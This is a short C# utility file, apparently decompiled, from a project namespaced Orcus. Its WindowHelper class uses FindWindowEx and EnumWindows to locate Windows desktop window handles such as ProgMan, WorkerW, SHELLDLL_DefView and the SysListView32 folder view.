using System;
using System.Text;
using Orcus.Native;

namespace Orcus.Utilities;

internal static class WindowHelper
{
	public static IntPtr GetDesktopWindow(DesktopWindow desktopWindow)
	{
		IntPtr shelldllDefViewParent;
		IntPtr intPtr = (shelldllDefViewParent = NativeMethods.GetShellWindow());
		IntPtr shelldllDefView = NativeMethods.FindWindowEx(intPtr, IntPtr.Zero, "SHELLDLL_DefView", null);
		IntPtr sysListView32 = NativeMethods.FindWindowEx(shelldllDefView, IntPtr.Zero, "SysListView32", "FolderView");
		if (shelldllDefView == IntPtr.Zero)
		{
			NativeMethods.EnumWindows(delegate(IntPtr hwnd, IntPtr lParam)
			{
				StringBuilder stringBuilder = new StringBuilder(256);
				if (NativeMethods.GetClassName(hwnd, stringBuilder, 256) > 0 && stringBuilder.ToString() == "WorkerW")
				{
					IntPtr intPtr2 = NativeMethods.FindWindowEx(hwnd, IntPtr.Zero, "SHELLDLL_DefView", null);
					if (intPtr2 != IntPtr.Zero)
					{
						shelldllDefViewParent = hwnd;
						shelldllDefView = intPtr2;
						sysListView32 = NativeMethods.FindWindowEx(intPtr2, IntPtr.Zero, "SysListView32", "FolderView");
						return false;
					}
				}
				return true;
			}, IntPtr.Zero);
		}
		return desktopWindow switch
		{
			DesktopWindow.ProgMan => intPtr, 
			DesktopWindow.SHELLDLL_DefViewParent => shelldllDefViewParent, 
			DesktopWindow.SHELLDLL_DefView => shelldllDefView, 
			DesktopWindow.SysListView32 => sysListView32, 
			_ => IntPtr.Zero, 
		};
	}
}
